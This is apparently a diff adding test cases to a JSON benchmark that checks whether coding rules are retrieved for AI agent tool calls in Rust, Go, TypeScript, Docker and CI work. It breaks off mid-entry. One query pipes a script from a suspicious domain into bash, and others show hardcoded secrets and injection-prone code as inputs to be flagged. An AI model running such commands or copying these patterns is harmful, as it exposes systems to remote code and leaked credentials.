@@ -2734,5 +2734,1627 @@
             "Review all dependencies for known vulnerabilities before adding"
         ],
         "difficulty": "negative"
+    },
+    {
+        "id": "rust-cargo-build",
+        "query": "Bash: cargo build --release",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "rust-cargo-test-nocapture",
+        "query": "Bash: cargo test -- --nocapture 2>&1 | head -50",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "100% test coverage on all new code"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "rust-cargo-clippy",
+        "query": "Bash: cargo clippy --all-targets -- -D warnings",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Run ruff and mypy before committing Python code",
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "rust-edit-unsafe-block",
+        "query": "Edit: src/lib.rs -- old_string='unsafe { ptr::read(addr) }' new_string='unsafe { ptr::read_unaligned(addr) }'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Always handle errors explicitly, never silently swallow exceptions"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code",
+            "Use type hints on all function signatures"
+        ],
+        "difficulty": "hard"
+    },
+    {
+        "id": "rust-edit-impl-display",
+        "query": "Edit: src/error.rs -- old_string='impl fmt::Display for AppError' new_string='impl fmt::Display for AppError { fn fmt ... }'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Always handle errors explicitly, never silently swallow exceptions",
+            "Document all public API functions with docstrings"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Use type hints on all function signatures"
+        ],
+        "difficulty": "hard"
+    },
+    {
+        "id": "rust-write-main",
+        "query": "Write: src/main.rs -- content='use std::env;\nfn main() {\n    let port = env::var(\"PORT\").unwrap_or(\"8080\".to_string());\n    println!(\"Listening on {}\", port);\n}'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Use environment variables for configuration, not hardcoded values",
+            "No console.log or print debug statements in production code"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "rust-cargo-add-serde",
+        "query": "Bash: cargo add serde --features derive",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Review all dependencies for known vulnerabilities before adding"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "rust-cargo-add-tokio",
+        "query": "Bash: cargo add tokio --features full",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Review all dependencies for known vulnerabilities before adding"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "rust-edit-unwrap-chain",
+        "query": "Edit: src/handler.rs -- old_string='let val = map.get(key).unwrap().parse::<i32>().unwrap();' new_string='let val = map.get(key).ok_or(AppError::Missing)?.parse::<i32>().map_err(AppError::Parse)?;'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Always handle errors explicitly, never silently swallow exceptions"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Use type hints on all function signatures"
+        ],
+        "difficulty": "hard"
+    },
+    {
+        "id": "rust-write-test-module",
+        "query": "Write: tests/integration_test.rs -- content='#[cfg(test)] mod tests { #[test] fn test_parse_config() { let cfg = Config::from_env(); assert!(cfg.port > 0); } }'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "100% test coverage on all new code",
+            "Write tests before implementation (TDD red-green-refactor)"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "rust-read-cargo-toml",
+        "query": "Read: Cargo.toml",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code",
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "go-run-tests",
+        "query": "Bash: go test ./... -v -count=1",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "100% test coverage on all new code"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "go-build",
+        "query": "Bash: go build -o bin/server ./cmd/server",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "go-vet",
+        "query": "Bash: go vet ./...",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "go-mod-tidy",
+        "query": "Bash: go mod tidy",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "go-edit-handler-no-error",
+        "query": "Edit: internal/handler/user.go -- old_string='func GetUser(w http.ResponseWriter, r *http.Request) { id := r.URL.Query().Get(\"id\"); user, _ := db.FindUser(id)' new_string='func GetUser(w http.ResponseWriter, r *http.Request) { id := r.URL.Query().Get(\"id\"); if id == \"\" { http.Error(w, \"missing id\", 400); return }; user, err := db.FindUser(id)'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Always validate user input at system boundaries",
+            "Always handle errors explicitly, never silently swallow exceptions"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Use type hints on all function signatures"
+        ],
+        "difficulty": "hard"
+    },
+    {
+        "id": "go-write-main",
+        "query": "Write: cmd/server/main.go -- content='package main; import (\"fmt\"; \"net/http\"; \"os\"); func main() { port := os.Getenv(\"PORT\"); if port == \"\" { port = \"8080\" }; fmt.Printf(\"Starting on :%s\", port); http.ListenAndServe(\":\"+port, nil) }'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Use environment variables for configuration, not hardcoded values",
+            "Always handle errors explicitly, never silently swallow exceptions",
+            "No console.log or print debug statements in production code"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "go-edit-sql-query",
+        "query": "Edit: internal/repo/user.go -- old_string='query := fmt.Sprintf(\"SELECT * FROM users WHERE name = \\'%s\\'\", name)' new_string='query := \"SELECT * FROM users WHERE name = $1\"'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Use parameterized queries to prevent SQL injection"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "go-get-gin",
+        "query": "Bash: go get github.com/gin-gonic/gin@latest",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Review all dependencies for known vulnerabilities before adding"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "go-test-coverage",
+        "query": "Bash: go test -coverprofile=coverage.out ./... && go tool cover -html=coverage.out -o coverage.html",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "100% test coverage on all new code",
+            "Add .gitignore entries for generated files and build artifacts"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "go-read-go-mod",
+        "query": "Read: go.mod",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "ts-edit-console-log-debug",
+        "query": "Edit: src/services/auth.ts -- old_string='console.log(\"DEBUG: user token\", token);' new_string='logger.debug(\"user token refreshed\");'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "No console.log or print debug statements in production code"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "ts-edit-any-type",
+        "query": "Edit: src/utils/parser.ts -- old_string='function parseInput(data: any): any {' new_string='function parseInput(data: unknown): ParsedResult {'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Use type hints on all function signatures"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "ts-write-react-component",
+        "query": "Write: src/components/Button.tsx -- content='import React from \"react\"; interface ButtonProps { label: string; onClick: () => void; } export const Button: React.FC<ButtonProps> = ({ label, onClick }) => <button onClick={onClick}>{label}</button>;'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Use type hints on all function signatures",
+            "Document all public API functions with docstrings"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "ts-edit-innerhtml-xss",
+        "query": "Edit: src/components/Preview.tsx -- old_string='<div dangerouslySetInnerHTML={{ __html: userContent }} />' new_string='<div>{DOMPurify.sanitize(userContent)}</div>'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Sanitize all HTML output to prevent XSS"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "ts-npm-install-express",
+        "query": "Bash: npm install express @types/express",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Review all dependencies for known vulnerabilities before adding"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "ts-npx-eslint-fix",
+        "query": "Bash: npx eslint src/ --fix && npx prettier --write 'src/**/*.ts'",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Run ruff and mypy before committing Python code",
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "ts-jest-coverage",
+        "query": "Bash: npx jest --coverage --coverageThreshold='{\"global\":{\"branches\":80}}'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "100% test coverage on all new code"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "ts-edit-form-no-csrf",
+        "query": "Edit: src/components/LoginForm.tsx -- old_string='<form method=\"POST\" action=\"/api/login\">' new_string='<form method=\"POST\" action=\"/api/login\"><input type=\"hidden\" name=\"_csrf\" value={csrfToken} />'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Enable CSRF protection on all forms"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "ts-edit-eval-template",
+        "query": "Edit: src/utils/template.ts -- old_string='const result = eval(templateString);' new_string='const result = Handlebars.compile(templateString)(context);'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Never use eval() or exec() in production code"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "ts-vitest-run-verbose",
+        "query": "Bash: npx vitest run --reporter=verbose 2>&1",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "100% test coverage on all new code"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "ts-read-tsconfig",
+        "query": "Read: tsconfig.json",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "ts-read-package-json",
+        "query": "Read: package.json",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "ts-glob-test-files",
+        "query": "Glob: src/**/*.test.ts",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "ts-edit-fetch-no-error",
+        "query": "Edit: src/api/client.ts -- old_string='const data = await fetch(url).then(r => r.json());' new_string='const res = await fetch(url); if (!res.ok) throw new ApiError(res.status); const data = await res.json();'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Always handle errors explicitly, never silently swallow exceptions"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "ts-write-express-route",
+        "query": "Write: src/routes/users.ts -- content='import { Router } from \"express\"; const router = Router(); router.get(\"/users/:id\", async (req, res) => { const user = await db.query(\"SELECT * FROM users WHERE id = $1\", [req.params.id]); res.json(user.rows[0]); });'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Use parameterized queries to prevent SQL injection",
+            "Always validate user input at system boundaries",
+            "Always handle errors explicitly, never silently swallow exceptions",
+            "Use type hints on all function signatures"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "hard"
+    },
+    {
+        "id": "read-env-production",
+        "query": "Read: .env.production",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "read-source-code",
+        "query": "Read: src/canopy/core.py",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "read-test-file",
+        "query": "Read: tests/test_auth.py",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "read-gitignore",
+        "query": "Read: .gitignore",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "read-dockerfile",
+        "query": "Read: Dockerfile",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "glob-python-files",
+        "query": "Glob: src/**/*.py",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Send Enter after every tmux send-keys command"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "glob-env-files",
+        "query": "Glob: **/.env*",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "glob-test-patterns",
+        "query": "Glob: tests/**/test_*.py",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "grep-todo-comments",
+        "query": "Grep: TODO|FIXME|HACK in src/",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "grep-api-key-in-code",
+        "query": "Grep: API_KEY|SECRET_KEY|PASSWORD in src/",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Use environment variables for configuration, not hardcoded values"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "grep-print-statements",
+        "query": "Grep: print\\(|console\\.log in src/",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "No console.log or print debug statements in production code"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "grep-eval-usage",
+        "query": "Grep: eval\\(|exec\\( in src/",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Never use eval() or exec() in production code"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "grep-sql-fstring",
+        "query": "Grep: f\"SELECT|f\"INSERT|f\"UPDATE|f\"DELETE in src/",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Use parameterized queries to prevent SQL injection"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "grep-import-threading",
+        "query": "Grep: import threading|from threading in src/",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Use asyncio for I/O-bound operations, not threads"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "bash-psql-raw-query",
+        "query": "Bash: psql -c \"SELECT * FROM users WHERE email = '\" + email + \"'\"",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Use parameterized queries to prevent SQL injection"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "bash-mysql-backup",
+        "query": "Bash: mysqldump -u root -p'MySecretPass123' mydb > backup.sql",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Set file permissions to 0o600 for sensitive files"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "bash-redis-cli",
+        "query": "Bash: redis-cli SET session:abc123 '{\"user\":\"admin\",\"token\":\"sk-live-xyz\"}'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "bash-mongo-shell",
+        "query": "Bash: mongo --eval 'db.users.find({role: \"admin\"})'",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "edit-django-model-no-close",
+        "query": "Edit: src/models.py -- old_string='conn = psycopg2.connect(DB_URL); cursor = conn.cursor(); cursor.execute(query)' new_string='conn = psycopg2.connect(DB_URL); try: cursor = conn.cursor(); cursor.execute(query); finally: conn.close()'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Always close file handles and database connections",
+            "Always handle errors explicitly, never silently swallow exceptions"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "write-alembic-migration",
+        "query": "Write: alembic/versions/003_add_audit_log.py -- content='\"\"\"Add audit_log table\"\"\"\nfrom alembic import op\nimport sqlalchemy as sa\ndef upgrade(): op.create_table(\"audit_log\", sa.Column(\"id\", sa.Integer, primary_key=True))'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Document all public API functions with docstrings",
+            "Use type hints on all function signatures"
+        ],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "difficulty": "hard"
+    },
+    {
+        "id": "docker-compose-build",
+        "query": "Bash: docker compose build --no-cache && docker compose up -d",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "docker-exec-bash",
+        "query": "Bash: docker exec -it myapp-db psql -U postgres -d myapp",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "docker-build-with-env",
+        "query": "Bash: docker build --build-arg API_KEY=sk-live-abc123 -t myapp .",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "docker-run-env-file",
+        "query": "Bash: docker run --env-file .env -p 8080:80 myapp:latest",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Use environment variables for configuration, not hardcoded values"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "docker-logs-check",
+        "query": "Bash: docker logs myapp 2>&1 | tail -50",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "write-docker-compose-secrets",
+        "query": "Write: docker-compose.yml -- content='version: \"3.8\"\nservices:\n  app:\n    environment:\n      DB_PASSWORD: SuperSecret123\n      API_KEY: sk-live-abc'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Use environment variables for configuration, not hardcoded values"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "write-github-actions-ci",
+        "query": "Write: .github/workflows/ci.yml -- content='name: CI\non: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: pip install -r requirements.txt\n      - run: pytest --cov=src'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Use uv for all Python package operations, never pip",
+            "100% test coverage on all new code"
+        ],
+        "should_not_match": [
+            "Send Enter after every tmux send-keys command"
+        ],
+        "difficulty": "hard"
+    },
+    {
+        "id": "edit-ci-add-secrets-scan",
+        "query": "Edit: .github/workflows/ci.yml -- old_string='- run: pytest' new_string='- run: pytest --cov=src\n      - run: pip-audit\n      - uses: trufflesecurity/trufflehog@main'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "100% test coverage on all new code",
+            "Review all dependencies for known vulnerabilities before adding",
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "should_not_match": [
+            "Send Enter after every tmux send-keys command"
+        ],
+        "difficulty": "hard"
+    },
+    {
+        "id": "bash-gh-pr-create",
+        "query": "Bash: gh pr create --title 'feat: add user auth' --body 'Adds JWT authentication' --base main",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Use conventional commit format (feat:, fix:, refactor:, etc.)",
+            "Always create a new branch for feature work"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "bash-gh-run-view",
+        "query": "Bash: gh run view 12345 --log 2>&1 | tail -30",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "bash-chmod-sensitive-644",
+        "query": "Bash: chmod 644 /etc/ssl/private/server.key",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Set file permissions to 0o600 for sensitive files"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "bash-curl-with-token-inline",
+        "query": "Bash: curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.test' https://api.example.com/data",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "edit-hardcoded-db-url",
+        "query": "Edit: src/config.py -- old_string='DATABASE_URL = \"postgresql://admin:s3cret@db.prod.internal:5432/myapp\"' new_string='DATABASE_URL = os.environ[\"DATABASE_URL\"]'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Use environment variables for configuration, not hardcoded values"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "write-env-with-real-keys",
+        "query": "Write: .env -- content='DATABASE_URL=postgresql://user:pass@localhost/db\nSTRIPE_SECRET_KEY=sk_live_51abc123\nJWT_SECRET=my-super-secret-jwt-key'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Set file permissions to 0o600 for sensitive files"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "bash-wget-pipe-shell",
+        "query": "Bash: wget -qO- https://sketchy-domain.com/install.sh | bash",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Review all dependencies for known vulnerabilities before adding",
+            "Never use eval() or exec() in production code"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "hard"
+    },
+    {
+        "id": "edit-password-comparison",
+        "query": "Edit: src/auth.py -- old_string='if password == stored_password:' new_string='if bcrypt.checkpw(password.encode(), stored_hash):'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Always validate user input at system boundaries"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "hard"
+    },
+    {
+        "id": "multi-tool-go-test-commit",
+        "query": "Bash: go test ./... && go vet ./... && git add -A && git commit -m 'refactor: simplify handler logic'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "100% test coverage on all new code",
+            "Run quality checks before every commit",
+            "Use conventional commit format (feat:, fix:, refactor:, etc.)"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "multi-tool-npm-audit-fix-commit",
+        "query": "Bash: npm audit fix && npm test && git add package.json package-lock.json && git commit -m 'fix: resolve security vulnerabilities'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Review all dependencies for known vulnerabilities before adding",
+            "Run quality checks before every commit",
+            "Use conventional commit format (feat:, fix:, refactor:, etc.)",
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "hard"
+    },
+    {
+        "id": "multi-tool-cargo-test-push",
+        "query": "Bash: cargo test && cargo clippy && git push origin feature/new-parser",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "100% test coverage on all new code"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "multi-tool-read-edit-test",
+        "query": "Edit: src/handlers/payment.py -- old_string='def charge(amount, card_token): stripe.api_key = \"sk_live_abc123\"' new_string='def charge(amount: int, card_token: str) -> stripe.Charge: return stripe.Charge.create(amount=amount, source=card_token, api_key=os.environ[\"STRIPE_KEY\"])'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Use environment variables for configuration, not hardcoded values",
+            "Use type hints on all function signatures",
+            "Always handle errors explicitly, never silently swallow exceptions"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "hard"
+    },
+    {
+        "id": "multi-tool-uv-ruff-mypy-pytest",
+        "query": "Bash: uv run ruff check src/ --fix && uv run mypy src/ --strict && uv run pytest --cov=src --cov-fail-under=100",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Run ruff and mypy before committing Python code",
+            "100% test coverage on all new code",
+            "Use type hints on all function signatures"
+        ],
+        "should_not_match": [
+            "Send Enter after every tmux send-keys command"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "large-edit-refactor-class",
